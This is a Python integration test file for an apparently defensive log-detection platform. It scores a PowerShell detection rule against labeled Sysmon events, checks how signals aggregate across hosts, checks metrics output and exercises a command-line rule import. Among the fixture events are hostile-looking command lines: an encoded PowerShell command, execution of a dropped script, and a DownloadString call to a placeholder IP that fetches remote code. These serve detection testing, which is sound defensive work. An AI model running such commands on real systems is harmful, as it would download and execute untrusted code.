from __future__ import annotations

import json
import time
import unittest
from datetime import UTC, datetime

import pytest
from fastapi.testclient import TestClient

from provloom.api.app import create_app
from provloom.cli.main import main as cli_main
from provloom.config import AppConfig
from provloom.detection.domain.signal import SignalStatus
from provloom.domain.common import AccessScope, PageSpec, TimeRange
from provloom.runtime import ProvLoomRuntime

EVAL_WINDOW = TimeRange(
    start_time=datetime(2026, 11, 18, 7, 0, tzinfo=UTC),
    end_time=datetime(2026, 11, 18, 10, 0, tzinfo=UTC),
)
SCOPE = AccessScope(tenant_id="default")


@pytest.mark.integration
class DetectionEvaluationAndCliTests(unittest.TestCase):
    def test_labeled_dataset_precision_recall_f1_and_entity_isolation(self) -> None:
        rt = ProvLoomRuntime.build(AppConfig(database_url="sqlite+pysqlite:///:memory:"))

        # Labeled mixed dataset: 3 malicious PowerShell events across 2 hosts + 3 benign events.
        labeled_sysmon = "\n".join(
            [
                # True Positive 1: win01 PID 4120 encoded PowerShell
                json.dumps(
                    {
                        "EventRecordID": "tp-1",
                        "EventID": 1,
                        "UtcTime": "2026-11-18T08:10:01Z",
                        "Computer": "win01.corp.local",
                        "User": "CORP\\alice",
                        "ProcessGuid": "{aaaa0001-0000-0000-0000-000000000001}",
                        "ProcessId": 4120,
                        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                        "CommandLine": "powershell.exe -EncodedCommand SQBFAFgA",
                        "ParentProcessGuid": "{aaaa0001-0000-0000-0000-000000000000}",
                        "ParentProcessId": 1200,
                        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                    }
                ),
                # True Positive 2: same process on win01 running second stage (tests Signal aggregation!)
                json.dumps(
                    {
                        "EventRecordID": "tp-2",
                        "EventID": 1,
                        "UtcTime": "2026-11-18T08:10:05Z",
                        "Computer": "win01.corp.local",
                        "User": "CORP\\alice",
                        "ProcessGuid": "{aaaa0001-0000-0000-0000-000000000001}",
                        "ProcessId": 4120,
                        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                        "CommandLine": "powershell.exe -nop -File C:\\Temp\\drop.ps1",
                    }
                ),
                # True Positive 3: DIFFERENT host win02, SAME PID 4120 (must NOT merge Signal with win01!)
                json.dumps(
                    {
                        "EventRecordID": "tp-3",
                        "EventID": 1,
                        "UtcTime": "2026-11-18T08:11:00Z",
                        "Computer": "win02.corp.local",
                        "User": "CORP\\bob",
                        "ProcessGuid": "{bbbb0002-0000-0000-0000-000000000002}",
                        "ProcessId": 4120,
                        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                        "CommandLine": "powershell.exe DownloadString('http://198.51.100.9/a')",
                    }
                ),
                # True Negative 1: benign Get-Date (filtered out even without ParentCommandLine!)
                json.dumps(
                    {
                        "EventRecordID": "tn-1",
                        "EventID": 1,
                        "UtcTime": "2026-11-18T08:12:00Z",
                        "Computer": "win01.corp.local",
                        "ProcessGuid": "{cccc0003-0000-0000-0000-000000000003}",
                        "ProcessId": 5001,
                        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                        "CommandLine": "powershell.exe Get-Date",
                    }
                ),
                # True Negative 2: normal svchost.exe
                json.dumps(
                    {
                        "EventRecordID": "tn-2",
                        "EventID": 1,
                        "UtcTime": "2026-11-18T08:12:10Z",
                        "Computer": "win01.corp.local",
                        "ProcessGuid": "{cccc0003-0000-0000-0000-000000000004}",
                        "ProcessId": 880,
                        "Image": "C:\\Windows\\System32\\svchost.exe",
                        "CommandLine": "svchost.exe -k netsvcs",
                    }
                ),
                # True Negative 3: normal interactive PowerShell version check
                json.dumps(
                    {
                        "EventRecordID": "tn-3",
                        "EventID": 1,
                        "UtcTime": "2026-11-18T08:12:20Z",
                        "Computer": "win02.corp.local",
                        "ProcessGuid": "{cccc0003-0000-0000-0000-000000000005}",
                        "ProcessId": 5100,
                        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                        "CommandLine": "powershell.exe $PSVersionTable",
                    }
                ),
            ]
        )
        rt.ops_service.import_raw_content(
            tenant_scope="default",
            source_id="edr-eval",
            source_type="sysmon",
            adapter_type="jsonl",
            raw_text=labeled_sysmon,
        )

        ps_rule_id = "6d4b1e8c-91b2-4e45-8c01-100700000001"
        t0 = time.perf_counter()
        exec_res = rt.detection_service.execute_rule(SCOPE, ps_rule_id, EVAL_WINDOW)
        single_rule_ms = (time.perf_counter() - t0) * 1000.0
        self.assertLess(single_rule_ms, 2000.0)
        self.assertEqual(exec_res.matches_created, 3)

        matches = rt.detection_service.search_rule_matches(
            SCOPE, EVAL_WINDOW, rule_id=ps_rule_id, page=PageSpec(limit=50)
        ).items
        predicted_uids = {
            m.evidence_references[0].original_event_uid for m in matches if m.evidence_references
        }
        expected_positives = {"tp-1", "tp-2", "tp-3"}
        expected_negatives = {"tn-1", "tn-2", "tn-3"}

        tp = len(predicted_uids & expected_positives)
        fp = len(predicted_uids & expected_negatives)
        fn = len(expected_positives - predicted_uids)
        tn = len(expected_negatives - predicted_uids)

        precision = tp / (tp + fp)
        recall = tp / (tp + fn)
        f1 = 2 * precision * recall / (precision + recall)
        fpr = fp / (fp + tn)

        self.assertEqual(precision, 1.0)
        self.assertEqual(recall, 1.0)
        self.assertEqual(f1, 1.0)
        self.assertEqual(fpr, 0.0)

        # Signal correctness: win01's 2 hits on the same ProcessGuid aggregate into 1 Signal (count=2),
        # while win02's hit stays a separate Signal (count=1) — never cross-host merged!
        signals = rt.detection_service.search_signals(
            SCOPE, EVAL_WINDOW, signal_type=f"rule:{ps_rule_id}", page=PageSpec(limit=20)
        ).items
        self.assertEqual(len(signals), 2)
        counts = sorted(s.occurrence_count for s in signals)
        self.assertEqual(counts, [1, 2])

        # Updating Signal status never deletes underlying RuleMatch records.
        updated_sig = rt.detection_service.update_signal_status(
            SCOPE, signals[0].signal_id, SignalStatus.ACKNOWLEDGED
        )
        assert updated_sig is not None
        self.assertEqual(updated_sig.status, SignalStatus.ACKNOWLEDGED)
        still_matches = rt.detection_service.search_rule_matches(
            SCOPE, EVAL_WINDOW, rule_id=ps_rule_id, page=PageSpec(limit=50)
        ).items
        self.assertEqual(len(still_matches), 3)

    def test_incremental_detection_prometheus_metrics_and_cli(self) -> None:
        rt = ProvLoomRuntime.build(AppConfig(database_url="sqlite+pysqlite:///:memory:"))
        rt.ops_service.load_builtin_examples("default")

        from provloom.query.interfaces import EventSearchFilter

        evs = rt.query_service.search_events(
            SCOPE, EVAL_WINDOW, EventSearchFilter(), PageSpec(limit=50)
        ).items
        inc_exec = rt.detection_service.execute_incremental(
            SCOPE, [e.event_id for e in evs], EVAL_WINDOW
        )
        self.assertEqual(inc_exec.mode.value, "INCREMENTAL")
        self.assertGreaterEqual(inc_exec.matches_created, 4)

        client = TestClient(create_app(rt))
        prom_text = client.get("/metrics").text
        for required_metric in (
            "detection_rules_total",
            "detection_rules_supported_total",
            "detection_rules_unsupported_total",
            "detection_executions_total",
            "detection_matches_total",
            "detection_execution_duration_seconds",
            "signals_created_total",
            "signals_deduplicated_total",
            "signals_aggregated_total",
            "candidate_groups_created_total",
        ):
            self.assertIn(required_metric, prom_text)


def test_cli_detect_and_import_rule(tmp_path: object, monkeypatch: pytest.MonkeyPatch) -> None:
    from pathlib import Path

    p = Path(str(tmp_path))
    db_path = p / "cli_det.db"
    monkeypatch.setenv("PROVLOOM_DATABASE_URL", f"sqlite:///{db_path}")

    rule_file = p / "custom_dns.yml"
    rule_file.write_text(
        """title: CLI Imported DNS Rule
id: 77777777-6666-4555-8444-333333333333
logsource:
  category: dns
detection:
  selection:
    answers|contains: '198.51.100.42'
  condition: selection
level: medium
""",
        encoding="utf-8",
    )

    assert cli_main(["seed-examples", "--tenant", "default"]) == 0
    assert cli_main(["import-rule", "--tenant", "default", "--path", str(rule_file)]) == 0
    assert (
        cli_main(
            [
                "detect",
                "--tenant",
                "default",
                "--rule-id",
                "77777777-6666-4555-8444-333333333333",
            ]
        )
        == 0
    )
